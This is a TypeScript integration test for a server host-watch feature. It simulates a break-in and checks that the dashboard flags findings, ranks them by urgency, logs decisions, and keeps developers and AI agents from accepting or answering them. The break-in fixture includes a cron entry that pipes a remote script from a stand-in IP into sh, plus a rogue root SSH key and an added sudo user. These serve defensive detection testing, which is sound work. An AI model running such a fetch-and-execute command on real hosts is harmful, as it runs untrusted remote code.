// The server watch from report file to answered finding, against a real EMPTY database (run by freshdb.sh); no containers.
import os from "node:os";
import path from "node:path";
import fs from "node:fs";

async function main() {
  const root = process.cwd();
  const { appRouter } = await import(root + "/src/trpc/index");
  const { db, users, hostItems, auditLogs } = await import("@dbbkp/db");
  const { issueSession } = await import(root + "/src/services/team");
  const { checkReport } = await import(root + "/src/services/hostwatch");
  const jwt = (await import("jsonwebtoken")).default;
  const bcrypt = (await import("bcryptjs")).default;
  let failed = 0;
  const pass = (ok: unknown, label: string, extra = "") => { if (!ok) failed++; console.log((ok ? "PASS  " : "FAIL  ") + label + (extra ? "  | " + extra : "")); };
  const code = async (p: Promise<unknown>) => p.then(() => "OK", (e: any) => e?.code ?? String(e?.message).slice(0, 60));
  const mk = async (username: string, role: string, extra: any = {}) => (await db.insert(users).values({ email: username + "@t.local", username, passwordHash: await bcrypt.hash("x".repeat(14), 4), role, ...extra }).returning())[0];
  const as = async (u: any, apiToken?: any) => { const s = await issueSession(u); const p: any = jwt.decode(s.token); return appRouter.createCaller({ user: { sub: u.id, sid: p.sid, username: u.username, role: u.role, mustChangePassword: false }, ip: "10.0.0.1", ...(apiToken ? { apiToken } : {}) }); };
  const owner = await as(await mk("owner", "admin"));
  const dev = await as(await mk("dev", "user", { teamRole: "developer" }));
  const agent = await as((await db.select().from(users))[0], { id: "t", scope: "full" });

  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "dk-watch-")), "inventory.json");
  let tick = 0;
  const write = (items: any[], minutesAgo = 0) => {
    fs.writeFileSync(file, JSON.stringify({ version: 1, generatedAt: new Date(Date.now() - minutesAgo * 60_000 + ++tick * 1000).toISOString(), hostname: "srv-1", asRoot: true, items }));
    fs.utimesSync(file, new Date(), new Date(Date.now() + tick * 1000)); // a new modification time each write
  };
  const it = (kind: string, key: string, label: string, detail: any, fp = "f1") => ({ kind, key, label, detail, fp });
  const base = [
    it("user", "user:root", "root", { uid: 0, login: true, hasPassword: true }),
    it("user", "user:deploy", "deploy", { uid: 1000, login: true, hasPassword: true }),
    it("ssh_key", "key:root:SHA256:aaa", "admin@laptop (root)", { user: "root", fingerprint: "SHA256:aaa", comment: "admin@laptop", file: "/root/.ssh/authorized_keys" }),
    it("cron", "cron:/etc/cron.d/backup:1", "backup.sh", { file: "/etc/cron.d/backup", user: "root", schedule: "0 3 * * *", command: "/usr/local/bin/backup.sh" }),
    it("port", "port:tcp:22", "tcp 22", { protocol: "tcp", port: 22, program: "sshd", public: true }),
  ];

  let s: any = await owner.host.summary();
  pass(s.installed === false && s.silent === false && s.urgent === 0, "before the first report the panel says the watch is not set up, and raises nothing");
  pass((await checkReport(file)) === null, "no report file is not an error");

  write(base);
  await checkReport(file);
  s = await owner.host.summary();
  pass(s.installed && s.hostname === "srv-1" && s.toReview === 5 && s.urgent === 0 && s.check === 0 && ((await owner.host.findings()) as any[]).length === 0, "the first report waits for one review and is not a list of alarms", JSON.stringify(s));
  let ov: any = await owner.system.overview();
  pass(ov.attention.some((a: any) => a.href === "/security" && a.text.includes("Review what was found")), "the Overview asks the admin to review it");
  pass((await code(dev.host.summary())) === "FORBIDDEN" && (await code(dev.host.initial())) === "FORBIDDEN" && !((await dev.system.overview()) as any).attention.some((a: any) => a.href === "/security"), "a developer sees none of it");
  pass((await code(agent.host.acceptInitial())) === "FORBIDDEN", "an AI agent cannot accept the baseline");
  pass((await owner.host.acceptInitial()).accepted === 5 && ((await owner.host.baseline()) as any[]).length === 5 && ((await owner.host.baseline({ kind: "user" })) as any[]).length === 2, "the admin accepts it once; it becomes the baseline");

  // the break-in
  write([
    ...base.filter((b) => b.key !== "cron:/etc/cron.d/backup:1" && b.key !== "port:tcp:22"),
    it("user", "user:support", "support", { uid: 1001, login: true, hasPassword: true }),
    it("admin", "admin:support:group sudo", "support", { user: "support", via: "member of the sudo group" }),
    it("ssh_key", "key:root:SHA256:evil", "x (root)", { user: "root", fingerprint: "SHA256:evil", comment: "x", file: "/root/.ssh/authorized_keys" }),
    it("cron", "cron:/var/spool/cron/crontabs/deploy:9", "curl", { file: "/var/spool/cron/crontabs/deploy", user: "deploy", schedule: "*/5 * * * *", command: "curl -s http://203.0.113.9/x.sh | sh" }),
    it("port", "port:tcp:22", "tcp 22", { protocol: "tcp", port: 22, program: "dropbear", public: true }, "f2"),
    it("port", "port:tcp:6379", "tcp 6379", { protocol: "tcp", port: 6379, program: "redis-server", public: false }),
  ]);
  const r: any = await checkReport(file);
  pass(r.added === 5 && r.changed === 1 && r.gone === 1, "the next report: five new things, one changed, one gone", JSON.stringify(r));
  s = await owner.host.summary();
  pass(s.urgent === 3 && s.check === 2 && s.note === 1 && s.toReview === 0 && s.baseline === 4, "counted by how urgent they are", JSON.stringify(s));
  const list: any[] = await owner.host.findings();
  pass(list.length === 6 && list.slice(0, 3).every((f) => f.severity === "urgent") && list[5].severity === "note", "the list puts urgent first");
  const key = list.find((f) => f.key === "key:root:SHA256:evil"), port = list.find((f) => f.key === "port:tcp:22");
  pass(key.reason.includes("without a password") && key.remove.command === "sudo ssh-keygen -lf /root/.ssh/authorized_keys" && port.status === "changed" && port.previous.program === "sshd", "each finding carries why it matters, how to remove it, and what it was before");
  ov = await owner.system.overview();
  pass(ov.attention.some((a: any) => a.kind === "security" && a.text.startsWith("3 urgent")) && ov.attention.some((a: any) => a.text.startsWith("2 changes")), "the Overview shows both counts in Needs attention");
  pass((await code(agent.host.decide({ ids: [key.id], answer: "expected" }))) === "FORBIDDEN" && ((await agent.host.findings()) as any[]).length === 6, "an AI agent can read findings and cannot answer them");

  // answering
  const redis = list.find((f) => f.key === "port:tcp:6379"), user = list.find((f) => f.key === "user:support");
  pass((await owner.host.decide({ ids: [redis.id], answer: "expected", note: "cache for the shop" })).decided === 1, "expected: the admin accepts one");
  pass((await owner.host.decide({ ids: [user.id], answer: "later" })).decided === 1, "look later: hidden for a day");
  s = await owner.host.summary();
  const row = (await db.select().from(hostItems)).find((x: any) => x.key === "port:tcp:6379");
  pass(s.note === 0 && s.check === 1 && s.baseline === 5 && row.status === "accepted" && row.note === "cache for the shop" && row.decidedBy, "the accepted one joins the baseline with the note and who decided", JSON.stringify(s));
  await db.update(hostItems).set({ snoozedUntil: new Date(Date.now() - 1000) }).where((await import("drizzle-orm")).eq(hostItems.id, user.id));
  pass(((await owner.host.summary()) as any).check === 2, "a postponed finding comes back when the day is over");
  pass((await owner.host.decide({ ids: [redis.id], answer: "expected" })).decided === 0, "something already accepted cannot be answered twice");

  // an accepted thing changes again; the attacker's things stay until answered
  write([...base, it("port", "port:tcp:6379", "tcp 6379", { protocol: "tcp", port: 6379, program: "redis-server", public: true }, "f3")]);
  await checkReport(file);
  const after: any[] = await owner.host.findings();
  pass(after.find((f) => f.key === "port:tcp:6379")?.status === "changed" && after.find((f) => f.key === "port:tcp:6379").previous.public === false, "an accepted port that opens to the outside is a new finding");
  pass(after.find((f) => f.key === "key:root:SHA256:evil")?.present === false && !after.some((f) => f.key === "cron:/etc/cron.d/backup:1"), "an unanswered finding that vanished stays on the list, marked as gone; a returned job is quiet");
  const gone = after.find((f) => f.key === "key:root:SHA256:evil"), still = after.find((f) => f.key === "port:tcp:6379");
  pass((await owner.host.decide({ ids: [still.id], answer: "dismiss" })).decided === 0, "a finding that is still on the server cannot be cleared away");
  pass((await owner.host.decide({ ids: [gone.id], answer: "dismiss" })).decided === 1 && !(await db.select().from(hostItems)).some((x: any) => x.key === "key:root:SHA256:evil"), "one that was removed from the server can; if it returns it is new again");
  pass((await checkReport(file)) === null, "a report that was already read is not read again");

  // silence
  write(base, 45);
  pass((await checkReport(file)) === null, "an older report never replaces a newer one");
  const { platformSettings } = await import("@dbbkp/db");
  await db.update(platformSettings).set({ value: { generatedAt: new Date(Date.now() - 45 * 60_000).toISOString(), hostname: "srv-1", asRoot: true, ingestedAt: new Date().toISOString(), items: 5 } }).where((await import("drizzle-orm")).eq(platformSettings.key, "hostwatch"));
  s = await owner.host.summary();
  ov = await owner.system.overview();
  pass(s.silent === true && ov.attention[0].text.includes("stopped reporting"), "no report for 45 minutes: the watch itself is the first thing in Needs attention");

  fs.writeFileSync(file, "{ not json");
  fs.utimesSync(file, new Date(), new Date(Date.now() + 99_000));
  pass((await code(checkReport(file))) !== "OK" && (await db.select().from(hostItems)).length > 5, "a broken report file is refused and changes nothing");

  await new Promise((r) => setTimeout(r, 500));
  const kinds = new Set((await db.select({ action: auditLogs.action }).from(auditLogs)).map((a: any) => a.action));
  pass(kinds.has("host_baseline_accept") && kinds.has("host_finding_decide"), "accepting the baseline and each answer are in the audit log");
  console.log(failed ? `${failed} FAILED` : "server watch holds");
  process.exit(failed ? 1 : 0);
}
main().catch((e) => { console.error("CRASH", e); process.exit(1); });
